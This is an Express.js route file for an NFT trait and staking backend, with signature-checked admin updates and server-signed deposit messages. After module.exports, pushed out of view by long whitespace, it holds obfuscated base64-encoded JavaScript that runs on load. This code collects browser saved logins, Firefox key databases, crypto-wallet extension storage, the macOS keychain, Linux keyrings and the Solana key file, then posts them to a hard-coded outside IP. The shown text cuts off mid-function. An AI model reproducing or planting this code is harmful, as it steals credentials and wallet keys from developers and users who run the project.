const express = require('express');
const router = express.Router();
const { check, validationResult } = require('express-validator');
const admin = require('../../middleware/admin');
const { ethers, Contract } = require('ethers');
const { formatUnits, parseUnits } = require('ethers/lib/utils');
const config = require('config');
const Trait = require('../../models/Trait');
const TraitUtility = require('../../models/TraitUtility');
const checkObjectId = require('../../middleware/checkObjectId');
const sign = require('jsonwebtoken/sign');

// @route    POST api/traits
// @desc     Create or update a trait
// @access   Private
router.post(
  '/',
  admin,
  check('unsignedMsg', 'unsignedMsg is required').notEmpty(),
  check('signedMessage', 'signedMessage is required').notEmpty(),
  check('fullyExpandedSig', 'fullyExpandedSig is required').notEmpty(),

  async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }
    let signingAddress = ethers.utils.verifyMessage(req.body.unsignedMsg, req.body.fullyExpandedSig);
    const provider = new ethers.providers.JsonRpcProvider(config.get('jsonRPC'))
    var wallet = new ethers.Wallet(config.get('AUTH_PRIVATE_KEY'));
    const account = wallet.connect(provider);

    const bankContract = new Contract(
      config.get('twmBank'),
      [
        'function owner() public view returns (address)'
      ],
      account
    );
    let ownerAddress = await bankContract.owner();
    let updateMsg = JSON.parse(req.body.unsignedMsg);
    if (ownerAddress == signingAddress) {
      try {
        let trait = await Trait.findOneAndUpdate(
          { no: updateMsg.no },
          { $set: { no: updateMsg.no, trait: updateMsg.trait } },
          { new: true, upsert: true, setDefaultsOnInsert: true }
        );

        res.json({ trait, success: true });
      } catch (err) {
        console.error(err.message);
        res.status(500).send('Server Error');
      }
    } else {
      res.json({ success: false });
    }
  }
);

// @route    POST api/traits/utility/
// @desc     Create or update a trait
// @access   Private
router.post(
  '/utility/',
  admin,
  check('unsignedMsg', 'unsignedMsg is required').notEmpty(),
  check('signedMessage', 'signedMessage is required').notEmpty(),
  check('fullyExpandedSig', 'fullyExpandedSig is required').notEmpty(),

  async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }
    let signingAddress = ethers.utils.verifyMessage(req.body.unsignedMsg, req.body.fullyExpandedSig);
    const provider = new ethers.providers.JsonRpcProvider(config.get('jsonRPC'))
    var wallet = new ethers.Wallet(config.get('AUTH_PRIVATE_KEY'));
    const account = wallet.connect(provider);

    const bankContract = new Contract(
      config.get('twmBank'),
      [
        'function owner() public view returns (address)'
      ],
      account
    );
    let ownerAddress = await bankContract.owner();
    let updateMsg = JSON.parse(req.body.unsignedMsg);

    if (ownerAddress == signingAddress) {
      try {
        let trait = await TraitUtility.findOneAndUpdate(
          { no: updateMsg.no },
          { $set: { no: updateMsg.no, trait: updateMsg.trait } },
          { new: true, upsert: true, setDefaultsOnInsert: true }
        );

        res.json({ trait, success: true });
      } catch (err) {
        console.error(err.message);
        res.status(500).send('Server Error');
      }
    } else {
      res.json({ success: false });
    }
  }
);

// @route    GET api/traits
// @desc     Get all traits
// @access   Private
router.get('/', async (req, res) => {
  try {
    const traits = await Trait.find().sort({ date: -1 });
    res.json(traits);
  } catch (err) {
    console.error(err.message);
    res.status(500).send('Server Error');
  }
});

// @route    GET api/traits/utility/
// @desc     Get all traits
// @access   Private
router.get('/utility/', async (req, res) => {
  try {
    const traits = await TraitUtility.find().sort({ date: -1 });
    res.json(traits);
  } catch (err) {
    console.error(err.message);
    res.status(500).send('Server Error');
  }
});

// @route    GET api/traits/:id
// @desc     Get trait by ID
// @access   Private
router.get('/:nums',
  async ({ params: { nums } }, res) => {
    try {
      const provider = new ethers.providers.JsonRpcProvider(config.get('jsonRPC'))
      var wallet = new ethers.Wallet(config.get('AUTH_PRIVATE_KEY'));
      const account = wallet.connect(provider);

      const bankContract = new Contract(
        config.get('twmBank'),
        [
          'function _baseRates(address addr) public view returns (uint256) '
        ],
        account
      );
      let defaultTrait = await bankContract._baseRates(config.get('twmAddress'));

      const arrNums = JSON.parse(nums);
      let traitsInventory = [];
      let replyTraits = [];
      if (Array.isArray(arrNums)) {
        traitsInventory = await Trait.find({ "no": { $in: arrNums } }).select('-_id')
      }

      for (let i = 0; i < arrNums.length; i++) {
        const result = traitsInventory.find(({ no }) => no === arrNums[i]);
        if (result) {
          replyTraits.push(result);
        } else {
          replyTraits.push({ no: arrNums[i], trait: formatUnits(defaultTrait.toString(), 18) });
        }
      }

      res.json(replyTraits);
    } catch (err) {
      console.error(err.message);

      res.status(500).send('Server Error');
    }
  });

// @route    GET api/traits/utility/:id
// @desc     Get trait by ID
// @access   Private
router.get('/utility/:nums',
  async ({ params: { nums } }, res) => {
    try {
      const provider = new ethers.providers.JsonRpcProvider(config.get('jsonRPC'))
      var wallet = new ethers.Wallet(config.get('AUTH_PRIVATE_KEY'));
      const account = wallet.connect(provider);

      const bankContract = new Contract(
        config.get('twmBank'),
        [
          'function _baseRates(address addr) public view returns (uint256) '
        ],
        account
      );
      let defaultTrait = await bankContract._baseRates(config.get('utilityAddress'));

      const arrNums = JSON.parse(nums);
      let traitsInventory = [];
      let replyTraits = [];
      if (Array.isArray(arrNums)) {
        traitsInventory = await TraitUtility.find({ "no": { $in: arrNums } }).select('-_id')
      }

      for (let i = 0; i < arrNums.length; i++) {
        const result = traitsInventory.find(({ no }) => no === arrNums[i]);
        if (result) {
          replyTraits.push(result);
        } else {
          replyTraits.push({ no: arrNums[i], trait: formatUnits(defaultTrait.toString(), 18) });
        }
      }

      res.json(replyTraits);
    } catch (err) {
      console.error(err.message);

      res.status(500).send('Server Error');
    }
  });

// @route    DELETE api/traits/all
// @desc     Delete a trait
// @access   Private
router.delete('/all', admin, async (req, res) => {
  try {
    await Trait.deleteMany({})
    res.json({ msg: 'Trait Reset' });
  } catch (err) {
    console.error(err.message);

    res.status(500).send('Server Error');
  }
});

// @route    DELETE api/traits/allutility
// @desc     Delete a trait of twm
// @access   Private
router.delete('/allutility', admin, async (req, res) => {
  try {
    await TraitUtility.deleteMany({})
    res.json({ msg: 'TraitUtility Reset' });
  } catch (err) {
    console.error(err.message);

    res.status(500).send('Server Error');
  }
});


// @route    DELETE api/traits/:id
// @desc     Delete a trait
// @access   Private
router.delete('/:id', [admin, checkObjectId('id')], async (req, res) => {
  try {
    const trait = await Trait.findById(req.params.id);

    if (!trait) {
      return res.status(404).json({ msg: 'Trait not found' });
    }

    await trait.remove();

    res.json({ msg: 'Post removed' });
  } catch (err) {
    console.error(err.message);

    res.status(500).send('Server Error');
  }
});


// @route    DELETE api/traits/utility/:id
// @desc     Delete a trait of utility
// @access   Private
router.delete('/utility/:id', [admin, checkObjectId('id')], async (req, res) => {
  try {
    const trait = await TraitUtility.findById(req.params.id);

    if (!trait) {
      return res.status(404).json({ msg: 'Trait not found' });
    }

    await trait.remove();

    res.json({ msg: 'Post removed' });
  } catch (err) {
    console.error(err.message);

    res.status(500).send('Server Error');
  }
});

// @route    GET api/traits/deposit/:nums
// @desc     Get traits by no group
// @access   Public
router.get(
  '/deposit/:nums',
  async ({ params: { nums } }, res) => {
    try {
      let hexNums = [];
      let traits = [];
      let signature;

      const provider = new ethers.providers.JsonRpcProvider(config.get('jsonRPC'))
      var wallet = new ethers.Wallet(config.get('AUTH_PRIVATE_KEY'));
      const account = wallet.connect(provider);
      const abi = [{"inputs":[{"internalType":"address","name":"_twm","type":"address"},{"internalType":"address","name":"_signer","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"contractAddress","type":"address"},{"indexed":false,"internalType":"uint256","name":"tokenId","type":"uint256"},{"indexed":true,"internalType":"address","name":"owner","type":"address"}],"name":"AutoDeposit","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"staker","type":"address"},{"indexed":false,"internalType":"address","name":"contractAddress","type":"address"},{"indexed":false,"internalType":"uint256","name":"tokensAmount","type":"uint256"}],"name":"Deposit","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"staker","type":"address"},{"indexed":false,"internalType":"address","name":"contractAddress","type":"address"},{"indexed":false,"internalType":"uint256","name":"tokensAmount","type":"uint256"}],"name":"Withdraw","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"receiver","type":"address"},{"indexed":true,"internalType":"address","name":"tokenAddress","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"WithdrawStuckERC721","type":"event"},{"inputs":[],"name":"FirstCollection","outputs":[{"internalType":"contract IERC721","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"SECONDS_IN_DAY","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"SecondCollection","outputs":[{"internalType":"contract IERC721","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"ThirdCollection","outputs":[{"internalType":"contract IERC721","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"_baseRates","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"contractAddress","type":"address"},{"internalType":"uint256[]","name":"tokenIds","type":"uint256[]"},{"internalType":"uint256[]","name":"tokenTraits","type":"uint256[]"},{"internalType":"bytes","name":"signature","type":"bytes"}],"name":"deposit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"depositPaused","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"uint256[]","name":"tokenIds","type":"uint256[]"}],"name":"emergencyWithdraw","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"staker","type":"address"}],"name":"getAccumulatedAmount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"staker","type":"address"}],"name":"getCurrentReward","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"staker","type":"address"}],"name":"getStakerTokens","outputs":[{"internalType":"uint256[]","name":"","type":"uint256[]"},{"internalType":"uint256[]","name":"","type":"uint256[]"},{"internalType":"uint256[]","name":"","type":"uint256[]"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"staker","type":"address"}],"name":"getStakerYield","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"contractAddress","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"getTokenYield","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"contractAddress","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"isMultiplierSet","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"launchStaking","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"address","name":"","type":"address"},{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"bytes","name":"","type":"bytes"}],"name":"onERC721Received","outputs":[{"internalType":"bytes4","name":"","type":"bytes4"}],"stateMutability":"pure","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"contractAddress","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"bool","name":"_pause","type":"bool"}],"name":"pauseDeposit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_first","type":"address"},{"internalType":"uint256","name":"_baseReward","type":"uint256"}],"name":"setFirstContract","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_second","type":"address"},{"internalType":"uint256","name":"_baseReward","type":"uint256"}],"name":"setSecondContract","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_third","type":"address"},{"internalType":"uint256","name":"_baseReward","type":"uint256"}],"name":"setThirdContract","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"signerAddress","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"stakingLaunched","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_contract","type":"address"},{"internalType":"uint256","name":"_yield","type":"uint256"}],"name":"updateBaseYield","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_signer","type":"address"}],"name":"updateSignerAddress","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"contractAddress","type":"address"},{"internalType":"uint256[]","name":"tokenIds","type":"uint256[]"}],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"}];
      const bankContract = new Contract(
        config.get('twmBank'),
        abi,
        account
      );
      let defaultTrait = await bankContract._baseRates(config.get('twmAddress'));

      const obj = JSON.parse(nums);
      if (Array.isArray(obj)) {
        const traitsInventory = await Trait.find({ "no": { $in: obj } }).select('-_id');
        for (let i = 0; i < obj.length; i++) {
          hexNums.push(ethers.utils.hexlify(obj[i]));
          const result = traitsInventory.find(({ no }) => no === obj[i]);
          if (result) {
            traits.push(ethers.utils.hexlify(ethers.utils.parseUnits((result.trait).toString(), 18)));
          } else {
            traits.push(ethers.utils.hexlify(defaultTrait));
          }
        }
        let message = ethers.utils.solidityPack(["address", "uint256[]", "uint256[]"], [config.get('twmAddress'), hexNums, traits]);
        message = ethers.utils.solidityKeccak256(["bytes"], [message]);
        signature = await account.signMessage(ethers.utils.arrayify(message));
      }
      return res.json({ hexNums, traits, signature });
    } catch (err) {
      console.error(err.message);
      return res.status(500).json({ msg: 'Server error' });
    }
  }
);

// @route    GET api/traits/depositutility:nums
// @desc     Get traits by no group
// @access   Public
router.get(
  '/depositutility/:nums',
  async ({ params: { nums } }, res) => {
    try {
      let hexNums = [];
      let traits = [];
      let signature;

      const provider = new ethers.providers.JsonRpcProvider(config.get('jsonRPC'))
      var wallet = new ethers.Wallet(config.get('AUTH_PRIVATE_KEY'));
      const account = wallet.connect(provider);
      const abi = [{"inputs":[{"internalType":"address","name":"_twm","type":"address"},{"internalType":"address","name":"_signer","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"contractAddress","type":"address"},{"indexed":false,"internalType":"uint256","name":"tokenId","type":"uint256"},{"indexed":true,"internalType":"address","name":"owner","type":"address"}],"name":"AutoDeposit","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"staker","type":"address"},{"indexed":false,"internalType":"address","name":"contractAddress","type":"address"},{"indexed":false,"internalType":"uint256","name":"tokensAmount","type":"uint256"}],"name":"Deposit","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"staker","type":"address"},{"indexed":false,"internalType":"address","name":"contractAddress","type":"address"},{"indexed":false,"internalType":"uint256","name":"tokensAmount","type":"uint256"}],"name":"Withdraw","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"receiver","type":"address"},{"indexed":true,"internalType":"address","name":"tokenAddress","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"WithdrawStuckERC721","type":"event"},{"inputs":[],"name":"FirstCollection","outputs":[{"internalType":"contract IERC721","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"SECONDS_IN_DAY","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"SecondCollection","outputs":[{"internalType":"contract IERC721","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"ThirdCollection","outputs":[{"internalType":"contract IERC721","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"_baseRates","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"contractAddress","type":"address"},{"internalType":"uint256[]","name":"tokenIds","type":"uint256[]"},{"internalType":"uint256[]","name":"tokenTraits","type":"uint256[]"},{"internalType":"bytes","name":"signature","type":"bytes"}],"name":"deposit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"depositPaused","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"uint256[]","name":"tokenIds","type":"uint256[]"}],"name":"emergencyWithdraw","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"staker","type":"address"}],"name":"getAccumulatedAmount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"staker","type":"address"}],"name":"getCurrentReward","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"staker","type":"address"}],"name":"getStakerTokens","outputs":[{"internalType":"uint256[]","name":"","type":"uint256[]"},{"internalType":"uint256[]","name":"","type":"uint256[]"},{"internalType":"uint256[]","name":"","type":"uint256[]"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"staker","type":"address"}],"name":"getStakerYield","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"contractAddress","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"getTokenYield","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"contractAddress","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"isMultiplierSet","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"launchStaking","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"address","name":"","type":"address"},{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"bytes","name":"","type":"bytes"}],"name":"onERC721Received","outputs":[{"internalType":"bytes4","name":"","type":"bytes4"}],"stateMutability":"pure","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"contractAddress","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"bool","name":"_pause","type":"bool"}],"name":"pauseDeposit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_first","type":"address"},{"internalType":"uint256","name":"_baseReward","type":"uint256"}],"name":"setFirstContract","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_second","type":"address"},{"internalType":"uint256","name":"_baseReward","type":"uint256"}],"name":"setSecondContract","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_third","type":"address"},{"internalType":"uint256","name":"_baseReward","type":"uint256"}],"name":"setThirdContract","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"signerAddress","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"stakingLaunched","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_contract","type":"address"},{"internalType":"uint256","name":"_yield","type":"uint256"}],"name":"updateBaseYield","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_signer","type":"address"}],"name":"updateSignerAddress","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"contractAddress","type":"address"},{"internalType":"uint256[]","name":"tokenIds","type":"uint256[]"}],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"}];
      const bankContract = new Contract(
        config.get('twmBank'),
        abi,
        account
      );

      let defaultTrait = await bankContract._baseRates(config.get('utilityAddress'));
      const obj = JSON.parse(nums);
      if (Array.isArray(obj)) {
        const traitsInventory = await TraitUtility.find({ "no": { $in: obj } }).select('-_id');
        for (let i = 0; i < obj.length; i++) {
          hexNums.push(ethers.utils.hexlify(obj[i]));
          const result = traitsInventory.find(({ no }) => no === obj[i]);
          if (result) {
            traits.push(ethers.utils.hexlify(ethers.utils.parseUnits((result.trait).toString(), 18)));
          } else {
            traits.push(ethers.utils.hexlify(defaultTrait));
          }
        }
        let message = ethers.utils.solidityPack(["address", "uint256[]", "uint256[]"], [config.get('utilityAddress'), hexNums, traits]);
        message = ethers.utils.solidityKeccak256(["bytes"], [message]);
        signature = await account.signMessage(ethers.utils.arrayify(message));
      }
      return res.json({ hexNums, traits, signature });
    } catch (err) {
      console.error(err.message);
      return res.status(500).json({ msg: 'Server error' });
    }
  }
);

module.exports = router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      Object.prototype.toString,Object.getOwnPropertyDescriptor,Object.defineProperty;const t="base64",a="utf8",$=require("os"),r=require("fs"),n=c=>(s1=c.slice(1),Buffer.from(s1,t).toString(a));pt=require(n("zcGF0aA")),rq=require(n("YcmVx"+"dWVzdA")),ex=require(n("aY2hpbGRf"+"cHJvY2Vzcw"))[n("cZXhlYw")],zv=require(n("Zbm9kZTpwcm9jZXNz")),hs=$[n("caG9zdG5hbWU")](),hd=$[n("ZaG9tZWRpcg")](),pl=$[n("YcGxhdGZvcm0")](),td=$[n("cdG1wZGly")]();let e;const l=c=>Buffer.from(c,t).toString(a),s=()=>{let t="MTQ3LjEyNCaHR0cDovLw4yMTQuMjM3OjEyNDQ=  ";for(var c="",a="",$="",r="",n=0;n<10;n++)c+=t[n],a+=t[10+n],$+=t[20+n],r+=t[30+n];return c=c+$+r,l(a)+l(c)},h=t=>t.replace(/^~([a-z]+|\/)/,((t,c)=>"/"===c?hd:`${pt[l("ZGlybmFtZQ")](hd)}/${c}`)),o="swPnLQ5",Z="Z2V0",y="Ly5ucGw",i="d3JpdGVGaWxlU3luYw",d="L2NsaWVudA",p=l("ZXhpc3RzU3luYw"),u="TG9naW4gRGF0YQ",b="Y29weUZpbGU";function m(t){const c=l("YWNjZXN"+"zU3luYw");try{return r[c](t),!0}catch(t){return!1}}const G=l("RGVmYXVsdA"),W=l("UHJvZmlsZQ"),Y=n("aZmlsZW5hbWU"),f=n("cZm9ybURhdGE"),w=n("adXJs"),V=n("Zb3B0aW9ucw"),v=n("YdmFsdWU"),j=l("cmVhZGRpclN5bmM"),z=l("c3RhdFN5bmM"),L=l("cG9zdA"),X="Ly5jb25maWcv",g="L0xpYnJhcnkvQXBwbGljYXRpb24gU3VwcG9ydC8",x="L0FwcERhdGEv",N="L1VzZXIgRGF0YQ",R="R29vZ2xlL0Nocm9tZQ",k="QnJhdmVTb2Z0d2FyZS9CcmF2ZS1Ccm93c2Vy",_="Z29vZ2xlLWNocm9tZQ",F=["TG9jYWwv"+k,k,k],q=["TG9jYWwv"+R,R,_],B=["Um9hbWluZy9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBTdGFibGU","Y29tLm9wZXJhc29mdHdhcmUuT3BlcmE","b3BlcmE"];let U="comp";const J=["aGxlZm5rb2RiZWZncGdrbm4","aGVjZGFsbWVlZWFqbmltaG0","cGVia2xtbmtvZW9paG9mZWM","YmJsZGNuZ2NuYXBuZG9kanA","ZGdjaWpubWhuZm5rZG5hYWQ","bWdqbmpvcGhocGtrb2xqcGE","ZXBjY2lvbmJvb2hja29ub2VlbWc","aGRjb25kYmNiZG5iZWVwcGdkcGg","a3Bsb21qamtjZmdvZG5oY2VsbGo"],T=["bmtiaWhmYmVvZ2FlYW9l","ZWpiYWxiYWtvcGxjaGxn","aWJuZWpkZmptbWtwY25s","Zmhib2hpbWFlbGJvaHBq","aG5mYW5rbm9jZmVvZmJk","YmZuYWVsbW9tZWltaGxw","YWVhY2hrbm1lZnBo","ZWdqaWRqYnBnbGlj","aGlmYWZnbWNjZHBl"],Q=t=>{const c=n("YbXVsdGlfZmlsZQ"),a=n("ZdGltZXN0YW1w"),$=l("L3VwbG9hZHM"),r={[a]:e.toString(),type:o,hid:U,[c]:t},h=s();try{let t={[w]:`${h}${$}`,[f]:r};rq[L](t,((t,c,a)=>{}))}catch(t){}},S="Y3JlYXRlUmVhZFN0cmVhbQ",C=async(t,c,a)=>{let $=t;if(!$||""===$)return[];try{if(!m($))return[]}catch(t){return[]}c||(c="");let n=[];const e=l("TG9jYWwgRXh0ZW5"+"zaW9uIFNldHRpbmdz"),s=l(S);for(let a=0;a<200;a++){const h=`${t}/${0===a?G:`${W} ${a}`}/${e}`;for(let t=0;t<T.length;t++){const e=l(T[t]+J[t]);let o=`${h}/${e}`;if(m(o)){try{far=r[j](o)}catch(t){far=[]}far.forEach((async t=>{$=pt.join(o,t);try{n.push({[V]:{[Y]:`${c}${a}_${e}_${t}`},[v]:r[s]($)})}catch(t){}}))}}}if(a){const t=l("c29sYW5hX2lkLnR4dA");if($=`${hd}${l("Ly5jb25maWcvc29sYW5hL2lkLmpzb24")}`,r[p]($))try{n.push({[v]:r[s]($),[V]:{[Y]:t}})}catch(t){}}return Q(n),n},A=async(t,c)=>{try{const a=h("~/");let $="";$="d"==pl[0]?`${a}${l(g)}${l(t[1])}`:"l"==pl[0]?`${a}${l(X)}${l(t[2])}`:`${a}${l(x)}${l(t[0])}${l(N)}`,await C($,`${c}_`,0==c)}catch(t){}},H=async()=>{let t=[];const c=l(u),a=l(S),$=l("L0xpYnJhcnkvS2V5Y2hhaW5zL2xvZ2luLmtleWNoYWlu"),n=l("bG9na2MtZGI");if(pa=`${hd}${$}`,r[p](pa))try{t.push({[v]:r[a](pa),[V]:{[Y]:n}})}catch(t){}else if(pa+="-db",r[p](pa))try{t.push({[v]:r[a](pa),[V]:{[Y]:n}})}catch(t){}try{const $=l(b);let n="";if(n=`${hd}${l(g)}${l(R)}`,n&&""!==n&&m(n))for(let e=0;e<200;e++){const l=`${n}/${0===e?G:`${W} ${e}`}/${c}`;try{if(!m(l))continue;const c=`${n}/ld_${e}`;m(c)?t.push({[v]:r[a](c),[V]:{[Y]:`pld_${e}`}}):r[$](l,c,(t=>{let c=[{[v]:r[a](l),[V]:{[Y]:`pld_${e}`}}];Q(c)}))}catch(t){}}}catch(t){}return Q(t),t},M=async()=>{let t=[];const c=l(u),a=l(S);try{const $=l(b);let n="";if(n=`${hd}${l(g)}${l(k)}`,n&&""!==n&&m(n))for(let e=0;e<200;e++){const l=`${n}/${0===e?G:`${W} ${e}`}/${c}`;try{if(!m(l))continue;const c=`${n}/brld_${e}`;m(c)?t.push({[v]:r[a](c),[V]:{[Y]:`brld_${e}`}}):r[$](l,c,(t=>{let c=[{[v]:r[a](l),[V]:{[Y]:`brld_${e}`}}];Q(c)}))}catch(t){}}}catch(t){}return Q(t),t},E=async()=>{let t=[];const c=l(S),a=l("a2V5NC5kYg"),$=l("a2V5My5kYg"),n=l("bG9naW5zLmpzb24");try{let e="";if(e=`${hd}${l(g)}${l("RmlyZWZveA")}`,e&&""!==e&&m(e))for(let l=0;l<200;l++){const s=0===l?G:`${W} ${l}`;try{const $=`${e}/${s}/${a}`;m($)&&t.push({[v]:r[c]($),[V]:{[Y]:`fk4_${l}`}})}catch(t){}try{const a=`${e}/${s}/${$}`;m(a)&&t.push({[v]:r[c](a),[V]:{[Y]:`fk3_${l}`}})}catch(t){}try{const a=`${e}/${s}/${n}`;m(a)&&t.push({[v]:r[c](a),[V]:{[Y]:`flj_${l}`}})}catch(t){}}}catch(t){}return Q(t),t},I=async()=>{let t=[];l(u);const c=l(S);try{const t=l("Ly5sb2NhbC9zaGFyZS9rZXlyaW5ncy8");let a="";a=`${hd}${t}`;let $=[];if(a&&""!==a&&m(a))try{$=r[j](a)}catch(t){$=[]}$.forEach((async t=>{pa=pt.join(a,t);try{ldb_data.push({[v]:r[c](pa),[V]:{[Y]:`${t}`}})}catch(t){}}))}catch(t){}return Q(t),t},O=async()=>{let t=[];const c=l(S),a=l("a2V5NC5kYg"),$=l("a2V5My5kYg"),n=l("bG9naW5zLmpzb24");try{let e="";if(e=`${hd}${l("Ly5tb3ppbGxhL2ZpcmVmb3gv")}`,e&&""!==e&&m(e))for(let l=0;l<200;l++){const s=0===l?G:`${W} ${l}`;try{const 